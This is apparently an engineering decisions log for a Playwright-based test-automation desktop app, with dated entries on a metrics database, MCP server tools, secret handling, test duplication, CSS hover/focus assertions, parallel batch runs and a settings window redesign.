**Two signals had to be recorded before the DB, because they are the only unrecoverable parts.** Everything else in the rollup is derived from files still on disk; these are not on disk at all until something writes them. First, the timeout a run *actually used*: §4.1's "failing step `ms` within ~10% of `testTimeoutMs`" was specified to read it from the TestRecord, which holds the CURRENT value — raise a test's timeout and every older run's step-vs-budget comparison silently becomes wrong while still looking plausible. Second, Auto-Heal attempts that FAILED: the fixture only ever wrote an event on success, so §4.1's site signal "tried every candidate and all failed" had no data source anywhere. That one is the more informative half of the pair — a step that healed says the locator went stale, a step that could not be healed says the element is *gone* — and it is never backfillable by definition.

**`step_metrics.ms` was going to measure the wrong thing entirely.** §3.2 annotates it "ArtifactStepEntry.ms" and §6.2 builds "checkout submit went 1.2s → 4.8s over six runs" on it. But that field is `Date.now() - tShot` around `page.screenshot()` — the SCREENSHOT's duration, and the number that gets summed into `captureMs`. The flagship suite-slowness view would have been a chart of how long PNGs take to write. The capture fixture now also times the action itself (`stepMs`), measured around `orig.apply` so it excludes the screenshot and the axe run but *includes* crawl's settling waits, which are time the step really took. Also not backfillable, so it shipped with the other two.

**No stored triage verdict.** §3.2 has `triage` and `triage_confidence` columns. A verdict frozen at the classifier version that wrote it goes stale silently: improve the classifier and old rows keep the old answer, so a trend chart mixes verdicts from several generations with nothing saying so. Triage is pure and cheap, so it is computed on read — which also means improving it improves every historical run at once, instead of requiring a rebuild to be visible.

**Three columns split, because the halves carry opposite evidence.** A `pageerror` is the page's own JavaScript throwing; a `console.error` is a log line healthy sites emit on every load. A 4xx on a *navigation* is often the page under test (a 404 page is a legitimate thing to test); a 4xx on anything else means an API contract broke. A step that healed blames the test; a step that could not be healed blames the site. Merged, each pair destroys its own signal — and §4.1 asks for the strong half of all three.

**`has_artifacts`, and then `console_dropped` / `network_dropped`.** The first was designed in: a run with no step rows must be able to say whether it captured nothing or captured and had nothing to report, because §4.2's `unknown` verdict depends on the distinction. The second came from running the rollup against real artifacts, and would not have been found any other way: the capture fixture keeps the first 100 and last 400 entries of each log OVERALL, not per step, so on a busy site the middle goes wholesale. One real run retained 500 network entries and dropped 1861, leaving three of its nine steps with no requests recorded at all. Without those counts, "no 5xx on the failing step" is indistinguishable from "that step's requests were thrown away" — and the first reads as evidence the site was healthy.

**The two step-index spaces, and the join that was hiding in a filename.** The app counts steps in Step[] order (the test record, the UI, replay.json) and in ACTION order (what the fixture numbers screenshots by, and tags every console/network entry with). Joining logs to steps needs the translation, and getting it wrong is silent — every number still lands in a row, just against the wrong step. It was recoverable only by parsing it back out of `ReplayStep.screenshot`'s filename, which is `null` whenever the shot failed and on *every* a11y-only or logs-only run: a join keyed on it matched nothing precisely when there were no screenshots around to notice were missing. `buildReplay` now records `actionIndex` explicitly. The rollup still reads the filename as a legacy path, since no replay.json written before this branch has the field — and that recovered 344 of 570 steps on the development machine, the rest being assertions and waits that legitimately perform no action.

**Running it against real data found two things reading it could not.** The most common "failure" in the entire history was a file path: Playwright emits `Error Context: test-results/…` in its attachments section, and it matched first for 109 of 207 failing runs — one cluster swallowing every genuinely distinct failure that had no other matching line. And signatures carried ANSI, because Playwright colours failures and the escape codes land *inside* the message, so a signature matched no other run unless that one happened to be coloured identically. With both fixed the top cluster is "Timed out `<ms>` waiting for expect(locator).toBeVisible()", shared by 26 runs — something worth acting on. The count of runs with a signature drops from 207 to 98, which is the honest number.

**No incremental migrations.** A version mismatch drops and replays. The database is a derived shadow of files that all still exist, so "migrate" and "rebuild" produce identical results — and only one of them can be got subtly wrong. This is also why corruption is a non-event and why a metrics failure is never allowed to reach a run.

**WAL, because two processes write one file.** The app and the standalone MCP server both ingest. Correctness never depended on the locking — every write is idempotent, the rollup being a pure function of a run's own artifacts — but "the app paused because an agent ran a test" is not a trade worth making for a cache. `foreign_keys = ON` is in the same list; while writing the check it turned out `node:sqlite`'s `DatabaseSync` enables foreign keys **by default**, unlike raw SQLite, so the pragma states the requirement rather than establishing it. The comment claiming otherwise was corrected, and the check pins the *outcome* (a deleted run takes its steps with it) rather than the pragma, so it still fails if either stops being true.

**`check:metrics-db` exercises a real database.** 55 assertions against a temp file, because "the same run ingested twice yields one row set" is behaviour and a source-text assertion would pass against a schema that does none of it. Each guarantee was reverted and confirmed to fail — including one that initially failed *badly*: a plain `INSERT` threw "UNIQUE constraint failed" as an uncaught exception rather than a named assertion, so the re-ingest is now caught and reported as the property it is.

### 2026-08-07 — MCP Phase 1: closing the drift, and the one gap that turned out to be a wall

Implements Phase 1 of [plans/mcp-and-test-intelligence.md](plans/mcp-and-test-intelligence.md). Four silent drift bugs, six new read tools, and one plan assumption that did not survive contact.

**Secrets cannot be injected from the MCP, and the plan assumed they could.** §1.4 called for injecting `GLAZE_SECRET_*` "exactly as `variableEnv` does". `variableEnv` reads `testSecretsStore`, which decrypts `test-secrets.bin` through `safeStorage` — a *native* API reached over the Glaze host bridge. A standalone `node mcp/server.mjs` has no bridge and never will, so there is no version of this that works. Three options were weighed with the maintainer: broker the values from the running app over the `debug-shots`-style request/response file protocol; delegate the whole run to the app's own runner; or refuse and say so. **Refuse.** Brokering would put plaintext credentials in a file under `userData`, breaking the guarantee the encrypted store exists to make ("the plaintext reaches the Playwright child process and nowhere else") for a crash window nobody would ever see. Delegating would fix all four bugs at once — one runner, no drift — but makes MCP runs need a GUI app open, which contradicts the server's whole premise and is useless to the unattended-agent and CI audiences the plan names first. Refusing costs the least and, importantly, is not a regression: today those runs go ahead, the spec resolves each secret to `""`, the test types empty strings into the login form, and it fails on an assertion several steps later with nothing connecting the two. An agent then debugs the *site*. A clear "this test needs secrets, run it from the app" is strictly more useful than that. `get_test` reports which variables are secret so it can be known before the call, and `run_batch` **skips** rather than fails such a test — a suite that reports red because one of its tests happens to log in is a suite nobody runs.

**The four bugs were ordered, not independent, and refusing preserves that.** The plan's §1.4 argues bugs 1 and 4 ship together: fixing secret injection without redaction creates a plaintext-credentials-on-disk path in a file `get_run_log` serves back. Refusing to inject satisfies that constraint from the other side — there is nothing to redact because nothing is injected. ANSI stripping still shipped on its own merits, and *on read* as well as on write, because every log written before today is still on disk full of `⌧[1A⌧[2K`, and `get_run_log` is what feeds them to a model. That is prompt budget spent on cursor movements.

**`shared/`, rather than five more `debug-shots`-shaped comparison tests.** The plan's §3.1 rule, adopted as written. What forced the point immediately: `playwright.config.ts` is written by *both* processes into the *same* directory, so whichever ran last won — and the MCP's copy had no `timeout` line at all. That is not a tidiness problem, it is behaviour that depends on which process last touched the disk. The speed→delay table had reached **four** transcriptions (`run-pacing.ts`, `server.mjs`, `llm-prompts.ts`, and the old `playwright-runner.ts` comment referencing them); all now import one definition. `check:crawl-speed`'s mirror assertions, which compared the copies, are replaced by assertions that **no copy exists** — comparing four spellings was only ever a way of surviving having four.

**`check:mcp-parity` runs the generator rather than reading the server.** The parity that matters is not "the two files look alike", it is "the env this server builds satisfies what the generated spec actually reads". So the check generates a spec, pulls every `process.env.X` out of it, and checks the MCP's env against that set. A source-text assertion would pass against a server that names all the right variables and sets none of them. Writing it surfaced a bug in the check itself worth recording: the first scan used `/process\.env\.([A-Z0-9_]+)/`, and `secretEnvName` does *not* uppercase — so `GLAZE_SECRET_password` matched as the bare prefix `GLAZE_SECRET_`, and the assertion would have been satisfied by any secret at all. Each of the four bugs was reverted in turn and confirmed to fail the check.

**Capture parity (§1c) is deliberately NOT in this change.** Making an MCP run appear in the Visual tab means producing `replay.json`, and that is built by `replay-builder.ts` → `visual-diff.ts` (pixelmatch + pngjs) → `a11y-diff.ts` → `script-generator.ts`. Porting that chain into `shared/*.mjs` is a large refactor that would strip the types off the spec generator — the module CLAUDE.md names as a security boundary, where a TypeScript type being *not* a runtime check is the documented lesson. Half-doing it is worse than not doing it: a run that writes screenshots but no replay model still does not appear in the Visual tab, so it would look finished and not be. The honest substitute is §1d, shipped here: every run response carries a `fixtures` field naming what it skipped, **measured against what the test itself asks for** rather than as a flat feature list. A test that never wanted screenshots is told nothing; a test with capture switched on is told exactly why its runs stopped showing up. `check:mcp-parity` pins those messages, so closing 1c has to change them rather than leave them lying.

**`get_run_logs` withholds when it cannot redact.** `console.json` and `network.json` are stored raw — the app strips secret values on the way *out*, in `artifact-store.readLogs`, because a test that logs in can put a credential in a request header or a query string. This process cannot redact, so it serves these only when **no test in the whole library** declares a secret. Library-wide, not per-test, matching why the app's redaction snapshot holds every value it knows rather than the current test's: any run's log can contain any test's secret. Deliberately strict — one secret anywhere disables the tool — because strict is the correct direction for a rule whose failure mode is silent disclosure. The refusal names where the redacted version can be read instead, and does not name the secret variables it is protecting.

**Driving the server for real found what reading it could not.** Every tool was exercised over stdio against the actual data directory before commit. `get_run_logs` threw `logs.console.filter is not a function`: the capture fixture writes `{ testId, runId, dropped, entries[] }`, not a bare array. `dropped` is now carried through — a log truncated by the per-run cap has to say so, or "no request matched" and "the request was past the cap" read identically to whoever is reasoning from it.

**`list_heals` reports chronic steps, not just events.** A list of heals sorted by time is a list in which the actual finding is invisible: one heal is an event, the *same step healing six times* is a decaying locator. The tool computes that count across everything retained and surfaces steps at three or more, alongside the per-entry chronology. The development machine's journal has exactly one such step.

### 2026-08-07 — Duplicating a test: an allowlist, a copied credential, and a dialog that usually doesn't appear

A copy of a test should be everything the test IS and nothing it has DONE. Most of that line drew itself: run history, screenshots, pinned visual baselines, step notes, the Auto-Heal journal and AI debug sessions all live in their own stores keyed by test id, so a new id starts empty in every one of them without a single delete. Only the fields ON the `TestRecord` had to be decided between, and exactly one of them is run output — `a11yBaseline`, the violations somebody accepted after looking at a real run. Carrying it would make the copy report a clean page it has never been run against, which is the one thing that feature must never do.

**The record is rebuilt from an allowlist, not spread.** Spreading the source and overwriting the handful of fields that must change is shorter, reads fine, and is the same shape as the step-ingest bug: it carries every field added later. `TestRecord` has grown 29 fields and will keep growing, so the next one that happens to be run state rides into every copy with nothing failing and nobody asked. `DUPLICATED_FIELDS` and `DROPPED_FIELDS` classify all 29, and `check:duplicate-test` parses the interface out of `types.ts` and fails while any field is missing from both — turning a bug that surfaces months later as "why does my copy think it passed?" into a 30-second decision at the moment the field is added. The check also asserts its own parser found a plausible field count, because an exhaustiveness check that silently parses zero fields is worse than no check: it reads as coverage.

**Secret values are copied, and that was a real choice.** The alternative — copy the declarations, make the user re-enter the values — keeps a credential in one place, which is the tidier security story. It also ships a duplicate that fails on its first run naming a `GLAZE_SECRET_*` env var the user has never seen, and the fix is to retype a password they may not have. The copy happens backend-to-backend through a new `testSecretsStore.copyTest`; no value crosses IPC in either direction, so duplication opens no route to reading a secret back out. The handler owns that step rather than the service, because it must be followed by `refreshSecretSnapshot()` — a copy whose secrets never reached the redaction snapshot writes that password into the next run log in plaintext, which is precisely the failure the secret store exists to prevent. The dialog says the credential now lives under two tests; that is the honest cost of the choice.

**The dialog appears only when something is active.** Variables, stored secrets, cookie/capture/`runFlow` steps, datasets, being a flow, hand-edited or imported — otherwise the click just duplicates. A confirmation on every duplication is a confirmation nobody reads, and the cost of that lands on exactly the cases it exists for: the copied credential, the recorded session cookie. `describeDuplicationWarnings` returning `[]` IS the "don't ask" decision, which is why the sidebar computes the warnings once and hands them to the dialog rather than the dialog deriving them — a component that sometimes renders nothing and instead fires a mutation from an effect is the wrong shape for both halves.

**Step ids are kept, not regenerated.** `visualMasks[].stepId` and `visualElementSteps` point at steps by id, so new ids would silently unhook every mask the user drew while the mask list still looked populated. Nothing keys on a step id without a test id alongside it, so two tests holding the same step id never meet.

**Naming counts hidden tests.** `<base> [n]`, lowest free n from 2 up, with the base stripped of an existing marker so duplicating a copy gives `[3]` rather than `Login [2] [2]`. The names are read through `testStore.allNames()` rather than `list()`, which hides hidden tests — a name taken by a hidden test would be handed out as free and the collision only appears the day that test is restored.

**Imported tests duplicate by copying the whole sandbox**, since an imported spec's `../helpers/x.ts` has to resolve in the copy too and the original checkout is long gone. Both roots are derived from ids and then asserted inside the scripts dir anyway (the same two-boundary rule as `copyRelativeImports` — one bounds reads, one bounds writes; ids are uuids and cannot escape, but layout logic drifts and an assert doesn't). Only regular files are copied: `readdirSync(withFileTypes)` reports entry types without dereferencing, so a symlink is skipped rather than followed. The importer already refuses siblings from outside the project it read, so a link should not be in there — but this copy must not be the thing that reads through one if it is.

One thing the test suite taught mid-change: the first pair of deep-copy tests were **vacuous**. They asserted the copy's arrays weren't the source's, through `duplicateTest` — but the store re-reads every record from JSON on every access, so the aliasing they were checking survives only inside a single call and the assertions compared against a different object entirely. Both passed with `structuredClone` replaced by the identity function. `inheritedFields` is exported for that reason and asserted directly, and every other test in the file was re-run against a deliberately broken implementation before being kept.

### 2026-08-07 — CSS assertions, and pseudo-states you can actually record

**Goal:** assert an element's computed CSS, and put the element into `:hover` / `:focus` / `:focus-visible` / `:active` first — because that is the only way most of those styles are ever reachable. The workflow being replaced is a person moving their mouse onto a button and looking at it.

**Real input, not a forced pseudo-class.** Chromium's CDP can force `:hover` with `CSS.forcePseudoState`, and it is by far the tidiest option — for Chromium. Runs here execute on Chromium, Firefox and WebKit (`RunBrowser`), and `locator.hover()` moves a real virtual mouse on all three. Chose the one that behaves identically everywhere over the one that reads better in a diff. Pseudo-*elements* (`::before`/`::after`) are out of scope for a separate reason: `toHaveCSS`'s `pseudo` option shipped in Playwright 1.60 and this repo pins 1.53.0.

**One awaited statement per step is the constraint the whole design bends around.** `stepLine` returns exactly one, and two independent mechanisms rely on it: `generateSpecDetailed` records one spec line per step in its line map, and `buildStepLineMap` — the fallback for hand-edited specs — classifies steps by counting leading-`await` lines. A step emitting two shifts every later step's run highlight by one. Routing a multi-call step through a runtime helper is the other obvious escape, and it costs the step its highlight instead (`StepReporter` drops any `pw:api` step whose `location.file` isn't the spec, which is what `glazeCapture` already pays).

So `ElementState` has four members that each compile to one call — `hover`, `focus`, `press` (`page.mouse.down()`), `release` (`page.mouse.up()`) — and the two pseudo-states that need more are **compositions the dialog emits as several ordinary rows**: `:focus-visible` → a plain `press` step with key `Tab`, then `focus`; `:active` → `hover`, `press`, `release`, with the user dragging the assertion between the last two exactly as they do with `if`/`end if`. Precedent: the "Wait until" dialog already emits one `wait` step per ticked property, and `onAdd` already takes a `RawStep[]`. Each row stays independently reorderable, editable and deletable, and a user reading `page.mouse.down()` in the list can see what will run. **Order is the entire meaning and is invisible once inserted** — a `press` before its `hover` presses wherever the pointer last was, a `Tab` after its `focus` moves focus off the element under test — so it is pinned in `element-states.test.ts` rather than left to the dialog, whose native-menu `Select` jsdom cannot drive at all.

**`press`/`release` deliberately carry no locator.** `page.mouse.down()` acts wherever the cursor is, which is where the preceding `hover` put it. A locator would be a second way to say the same thing, and the two would disagree the moment either was edited.

**The trainer preview moves a real cursor, because a synthetic one proves nothing.** `:hover` is not an event — it follows the OS pointer, which is why "you cannot hover" is a documented Cypress limitation. A dispatched `mouseover` would fire the page's handlers, apply no style, and report success: the preview would certify precisely the thing it failed to test. `input-service.ts` therefore takes the same shape as `resize-service.ts` — a backend service dispatched from `runStep`, because the capability lives on the native window. Split by who can answer: the PAGE resolves the locator and reports the element's centre point (only it can), the WINDOW sends `mouseMove`/`mouseDown`/`mouseUp` via `webContents.sendInputEvent` (only it can). A real run uses none of this.

**Three things about that were only obvious once written.** A press with no preceding hover is **refused**, not defaulted to `(0, 0)` — the origin is a real left click on the top-left corner of a live page. `releaseHeldMouse` runs in `withCaptureSuspended`'s `finally`, beside the capture restore and for the same reason: a failing assertion between press and release stops the replay, and unlike a real run (which tears the browser down) the training window stays open with the button held, turning the user's next click into a drag. And a lone `press` lost its per-step ▶, since replaying it alone can only ever leave the window stuck.

**Two silent bugs found while building it, neither in the feature.**
- **`captureMethod` would have desynced every screenshot after the first hover.** `hover` and `focus` are already in `LOCATOR_ACTIONS`, so the capture fixture writes a manifest entry for them — but `replay-builder` walks the manifest with a single pointer that only advances when a step's `captureMethod` matches the entry at the front. An unclassified `state` step leaves its entry unconsumed, the next step compares `click` against `hover`, and **the pointer never advances again**: every later step silently loses its screenshot, geometry, a11y results and visual diff while the run still reads as captured. Pinned in `visual-pipeline.check.ts`, which previously hard-coded `["goto","fill","click"]` and could not have seen it.
- **`page.mouse.down()` was invisible to the parser — not skipped, swallowed.** The unclassified-statement fallback matched `page.<method>(` but not a nested `page.a.b(`, so the scan walked such statements character by character and they produced neither a step nor a skip. That is strictly worse than the `.hover()` wart being fixed here (which at least incremented `skipped` and flagged `stepsDiverged`): the statement simply vanished on the next `tests:updateScript` resync. The fallback now matches dotted paths, so `page.mouse.move`, `page.keyboard.down` and `page.clock.*` are at least *counted*.

**`.hover()` and `.focus()` now parse, which fixes an existing wart.** Both used to land in the unclassified branch, so importing anyone's Playwright test that hovered flagged it permanently diverged. `spec-parser.check.ts` had *pinned* that behaviour; that assertion is inverted.

**`describeStep` parity was weaker than it read.** Its "covers every step type" guard was a hand-written list that had already fallen two step types behind (`capture` and `runFlow` were missing) and passed anyway. Both it and the assert-kind list are now derived from `STEP_TYPES` / `ASSERT_KINDS`, and the two missing types got cases. A guard you have to remember to update is the bug it exists to catch.

**Kebab-case, everywhere, and checked.** `getComputedStyle().getPropertyValue()` answers `""` for a camelCase name rather than throwing — on both sides, the capture script reading the value and `toHaveCSS` comparing it. So `cssPropsOf` moved off camelCase bracket access, and the property list is interpolated into both injected scripts from one constant (the `page-actions.ts` idiom) rather than hand-written twice as it was. `check:css-assertions` pins the casing, the single definition, and the backend↔renderer mirror.

**Expected values are picked, not typed.** Playwright compares the COMPUTED value: `red` never matches `rgb(255, 0, 0)`, `bold` never matches `700`. The dialog lists the picked element's live computed values one click away — and labels them honestly, because picking an element means the user's real cursor was over it, so `:hover` styling is already included. That is exactly right for a hover assertion and exactly wrong read as resting styles. The replay log additionally calls out an empty computed value by name, since that almost always means the property name is wrong rather than the style being absent.

**`cssProp` is checked for SHAPE at the boundary, not just quoted at the generator.** It is the one free string with a known grammar. `q()` would quote a hostile value safely today, but "safe through the current sink" describes today's generator rather than the data — the same argument that put every numeric field through `int()` as well as `num()`. `recorder:updateStep` copies its allowlisted fields without re-normalizing, so the generator re-validates independently; `check:step-ingest` pins both halves, and the `contains` arm is pinned by PARSING the emitted line rather than grepping it (grepping for `require(` passes for the wrong reason — `reEscape` removes the parenthesis either way).

**Auto-Heal retries now go through `runStep`.** They called `buildReplayScript` directly, which was the same thing until a step kind gained a native half: a healed `state: "hover"` would have reported success from the page finding the element while the pointer never moved.

**Known limits, stated rather than discovered.** `page.mouse.*` is on a nested object that no fixture patches, so `press`/`release` produce no capture screenshot and no crawl settle; `hover`/`focus` behave normally. `:focus-visible` depends on the browser's keyboard-modality heuristic and is the least robust of the four — the dialog says so, and a failure there is at least loud.

### 2026-08-07 — Parallel batch runs: lanes, not a worker pool over the queue

Batches ran strictly one test at a time, which on a ten-core machine made a suite take the sum of its parts. Adding a "how many at once" picker is the easy half; the design is all in what makes concurrency *safe here*.

**`runId === testId` is the constraint everything follows from.** `playwrightRunner.start` keys a live run by test id, and so does every per-run map it owns plus the `runner:output` / `runner:step` / `runner:done` stream. Two *different* tests in flight were therefore already unambiguous — the renderer's run store is a map keyed by `runId`, so it needed no change at all. The *same* test twice is the problem: `start()` declines the second with `alreadyRunning`, and the batch marks that entry **skipped**. A dataset sweep queues exactly that — one entry per row — so a naive pool would turn "run all 3 rows" into "run 1 row and skip 2", silently, with the batch still reporting green.

So the queue is partitioned into **lanes keyed by test id**: lanes run concurrently, entries within a lane stay sequential. Rejected: making `runId` unique per execution. It is the correct long-term shape, but it reaches the run store, the output panel, `stop`, `isRunning`, the AI-debug wiring and the artifact joins — a much larger change to buy the same behaviour a lane already gives.

**The sequential path had to stay the *same* path, not a parallel one with the dial at 1.** Lanes are flattened in first-appearance order, so one worker walks the queue in queue order — but only if each test's entries are contiguous. `["a", "b", "a"]` breaks that, and a check caught it: with a repeated id, lane grouping reordered the queue. `buildQueue` now dedupes the selection. The Batch view's selection is a `Set` and can't produce a repeat; IPC and the MCP can, and running one test twice in a batch with identical options has no meaning anyway.

**The warning is about windows, not tests.** "Warn above 10 headed in parallel" could mean the selection size or the concurrency. It has to be the concurrency: 40 tests at "4 at once" never shows more than four windows, while "all at once" with 14 shows fourteen. Warning on the selection would nag about the safe case and stay silent on the loud one — and a dialog people learn to click through protects nothing. Headless skips it entirely: nothing appears on screen, so there is nothing to warn about however wide the batch is.

**Three latent races that only concurrency makes real**, all in `playwright-runner.ts` and all fixed here rather than left to surface as flakiness:

- Every `ensure*` helper truncates-and-rewrites a file *shared by all runs*, on *every* run, while other runs' Playwright processes may be reading it. `writeIfChanged` compares first and renames into place when it must write — and since the content is fixed per app build, it writes nothing at all after the first run of a session.
- N runs discovering the same missing engine at once meant N `playwright install` processes unpacking into one directory. Now the first caller installs and the rest await it. The waiters are *told* they're waiting, because the install's output streams to a different run's Output panel and silence there looks like a hang.
- Playwright derives its output directory from the spec's path, so two runs of one spec would share and clean the same folder. Each run now passes its own `PW_OUTPUT_DIR`. Lanes already prevent that case in the app, but the MCP has no lanes — and it is cheap insurance either way.

That last one put the generated `playwright.config.ts` in two hands: the app writes it on every run, the MCP server writes its own copy, and they share the directory — so whichever ran last wins. A field present in one copy and not the other doesn't fail, it works *intermittently*, which is close to the worst way for a bug to present. Both now read from a dedicated source module and `check:runner-config` pins them byte-identical.

**`currentIndex` is derived rather than deleted.** With several tests in flight there is no single current one, but the field is persisted and pre-parallel `BatchRecord`s are still loaded back. It is now the lowest-index running entry (-1 when idle), which degrades to exactly the old meaning when one test runs. The Batch view stopped reading it and counts the results instead.

**`stop()` killed `results[currentIndex]`.** With several in flight that left the other browsers open while the UI reported the batch as stopped — windows the user then closes by hand. It now kills every running entry; a check pins it, and reverting the fix fails that check specifically.
### 2026-08-07 — Settings: three fixes the redesign's own layout caused, and one confirmation

Three problems visible in the first build of the new window. Two are the same bug wearing different clothes, and the third is a deliberate speed bump.

**A horizontal row is two columns competing for one width, and the wide one wins.** `SettingRow` put the control in a right-hand column. That is right for a switch and wrong for a *cluster*: the webhook row's control is a password field plus Save, Send test and Remove, so it claimed most of the row and left the label column narrow enough that "Webhook URL" broke across two lines and its summary rendered roughly one word per line. Adding `stacked` (the SDK `Field`'s `orientation="vertical"`) puts the control on its own full-width line beneath the text, so each gets the whole width in turn. Rejected: capping the control's width instead — it fixes the label and moves the wrapping into the button row, and the next row with a cluster hits it again.

**The same collision, quieter, in Storage.** "days" was a `<span>` *beside* the number input. Because the row right-aligns its control, that span displaced the field leftward by exactly its own width — so the days field and the history field above it, both `w-24`, sat on two different vertical lines with nothing on screen explaining why. The SDK's `NumberInput` takes a `unit` that renders inside the control, which makes the field the whole control again; equal widths then align. This is worth writing down because the fix that suggests itself — nudging a margin until it looks right — encodes the width of the word "days" and silently breaks if the unit or the font changes. **`auto-heal-timeout` had the identical `<span>ms</span>` form** and was fixed the same way in the same change; both panes now name their shared width in one constant rather than repeating a literal, so the two controls cannot drift apart one edit at a time.

One thing the move costs: `NumberInput` renders `unit` as `aria-hidden` decoration. The old `<span>ms</span>` was not announced either, so nothing regressed — but it means the unit can only ever reach a screen reader through the accessible name, which is why `auto-heal-timeout` keeps its explicit `aria-label="Per-attempt timeout in milliseconds"` and has a test pinning it. `artifact-retention-days` needs no equivalent: its label already ends in "older than" and its summary gives the unit.

**Turning the webhook ON asks first; turning it OFF does not.** This is the only setting in the app whose *side effect outlives the click*: after it, every failing run POSTs somewhere, without asking again. The `danger` badge and the always-visible summary describe that, but they are equally present whether the switch is on or off — nothing marks the moment of consent. The confirmation names the destination host, since the URL is write-only and the host is all the user can still verify. The switch stays bound to the saved setting rather than to local state, so it does not flip while the dialog is open — a switch that has already moved makes the dialog read as "you did this, did you mean it?" rather than as a decision still to be made. OFF is unguarded on purpose: it only stops the sending, and a prompt in the harmless direction is what teaches people to dismiss the one in the harmful direction. `AlertDialog`, not `Dialog` — single decision, `role="alertdialog"`, no side actions to invent.

### 2026-08-07 — Settings: eight panes and a search box, not a longer scroll

**The diagnosis was not "it's too long".** `settings-view.tsx` was 1,359 lines rendering ~30 rows into a 560×480 window — about eight screens. But length was the symptom. Three things caused it:

- **There were no section headings at all.** Six `<FieldSet>` elements, none with a `title`. The only heading in the entire window was "Aesthetic Enhancements", and it was *faked* — a `Field` with a label and no control. Grouping was communicated purely by `gap-8` whitespace, so a user could see that a boundary existed but never learn what was on either side of it. The SDK's `FieldSet` has taken `title`/`description` the whole time; the file imported it and never passed them.
- **One FieldSet was doing four unrelated jobs.** Lines 689–1016 held trainer settings, recording defaults, run defaults, artifact retention and webhook alerting in a single 327-line block. "Dock the trainer to the browser" and "Delete screenshots older than" were siblings with equal weight.
- **Descriptions were ~2/3 of the vertical space**, permanently, for prose each user reads once.

**Chosen: sidebar + panes + search, over tabs and over a fixed flat list.** Tabs at 560px would be cramped at eight sections and would hide that the other sections exist; a flat list with headings fixes legibility but not findability, and this window demonstrably grows a row at a time. Search is the highest-value part: at ~30 settings the real daily question is "where is the headless toggle", and no amount of grouping answers that as directly as typing "headless". It filters the sidebar AND the rows inside the pane, because jumping to a pane and leaving the user to scan it again only solves half of it.

**The IA claim worth defending: "Test defaults" is a real category, not a bucket.** A third of the window's settings answer one question — what a NEW test should do before anyone touches its own controls — and they map one-to-one onto the six run controls in `test-detail-view.tsx`. Scattered, each row had to re-explain the relationship in its own prose ("Each test remembers its own choice", "each test has its own toggle", "Each test can still be overridden from its sidebar menu"). Collected and ordered to match that toolbar, the pane subtitle says it once and every row got shorter.

**Progressive disclosure, with one hard exception.** `summary` always visible, `details` behind a disclosure. But `danger` rows **refuse** `details` at the component level rather than relying on callers: the two that carry it warn about storing `Authorization`/`Cookie` headers and about the webhook being the only thing that sends data off this Mac automatically. A warning behind a click is a warning most people never read, and the webhook copy was already corrected once (2026-08-06) for overclaiming. Enforcing it in `SettingRow` means the next dangerous row inherits the rule instead of depending on whoever adds it.

**Dependent settings are unmounted, not greyed.** `recordAllHeaders` used to render as a greyed sibling of `defaultRecordLogs` with nothing on screen saying what controlled it — "greyed out" is not a state a user can act on. The Auto-Heal parameters were worse: fully editable with Auto-Heal off, writing settings nothing would read.

**Rejected — one hook per pane.** Would have been tidier, but two loads have side effects that fire when the WINDOW opens: the LLM auto-probe repairs a configured model that is no longer installed, and the settings load feeds every pane's modified-count. Per-pane state means a stale model is only repaired if you happen to click AI, and a count that is blank until you visit. The controller stayed whole.

**Rejected — rolling back a failed save.** `save` is optimistic and stays optimistic. A rollback lands while the user is still typing in the field that failed.

**Two bugs found on the way, neither in the redesign's scope:**
- `text-muted-foreground` — used ~20× in the old view for every description — is **not a class the design system defines**. No `muted-foreground` token exists in `components.tailwind.css` and it emits no CSS, so every description had been rendering at full-strength primary text. That is a large part of why the window read as an undifferentiated wall, and it is the same dead-class family DECISIONS flagged on 2026-08-06 (`bg-muted` in this very file). The new rows use the SDK's `FieldDescription`.
- A **resolved** `null` from `recorder:getSettings` crashed the window. The old code read keys off it inside a `.then()` where the throw was swallowed by the chain's `.catch`; consolidating the load made it fatal. It is now coerced to `{}` — every pane already treats a missing key as its default. Caught by a test written for it, which is the whole argument for writing the pessimistic ones.

**Coverage:** 241 tests across the settings tree (118 pure schema tests in the node project; the rest per-component). Each pane is tested against a hand-built controller so a case reads as "headless is already on, and the user turns it off" rather than being re-derived through six async loads. The security assertions that used to live in `settings-view.test.tsx` — the webhook and API key being write-only — moved to the panes that now hold those controls; they did not go away. Verified failing-when-broken for the danger-row rule, the row filter, the reset patch's scope, the search auto-switch, the load helper's synchronous-throw guard, and the schema's one-pane-per-key invariant.

**Also fixed:** `SidebarListItem` activates on **mouse-down**, not click — the same native-macOS idiom as Radix's `TabsTrigger`, and the same silent failure (`fireEvent.click` leaves the row untouched and the assertion reports "0 calls", which reads as a broken handler). Added to CLAUDE.md's environment gotchas. The sidebar also now sets `aria-current="page"` itself, since the SDK's `selected` only applies a background class and announced nothing.

### 2026-08-07 — Guarding the two shells against silent drift

**The problem is that drift is invisible.** `main` builds on the Glaze SDK, `shell/electron` on stock Electron; they are the same application. When a feature lands on one and not the other, both branches stay green, both apps run, and the only symptom is a feature that exists in one build and not the other — found whenever someone happens to use the other one. The trees reached 13 commits apart without anyone noticing, and **within an hour of being brought level a settings redesign put them apart again.** No process fixes that; a check does.

**`check:shell-drift` compares the two trees modulo a declared seam.** Four rewrites are the entire sanctioned difference between their imports (`@glaze/core/backend`→`@shell/backend`, `components`/`hooks`→`@ui`, the two stub names), plus one more that has to collapse to a marker rather than rewrite: `@glaze/core/ipc`'s replacement is a *relative* path, so it is spelled differently depending on the importing file's depth. Any shared file differing after that is drift.

Two lists carry the exceptions, and both are deliberately explicit. `SHELL_BOUNDARY` names the 10 files the shells genuinely cannot share — entry points, window creation, the preload, the token bridge — **each with a reason**, because "these differ legitimately" and "a feature landed on one side" look identical without one. `ONE_SIDED` names the paths expected on exactly one side: `main/shell/`, `renderer/ui/`, `renderer/dev/`.

**It also reports exceptions that are no longer needed.** A boundary entry for a file that has stopped differing is not a failure, but it would hide real drift in that file from then on. That fired immediately: PR #19's rewrite made `settings-view.tsx` and `settings-window.ts` converge, and both were removed.

**Rejected: failing when the counterpart branch is absent.** If the trees ever converge, the check exits 0 with a note. A guard that goes red because the problem it guards against was *solved* teaches people to ignore it.

**The second guard is smaller and catches something worse.** `test:checks` is a hand-maintained `&&` chain of ~29 script names, and it is what `test:all` — the thing the pull-request template asks people to run — actually executes. A check defined but left out of that chain is **a test that passes by never running**, and nothing else notices: the suite is green, the script exists, its file is still in the tree being reviewed. The two branches had already drifted on the chain's contents. It now lives in `check-repo-hygiene`, which needs no SDK and so runs on both branches' CI today.

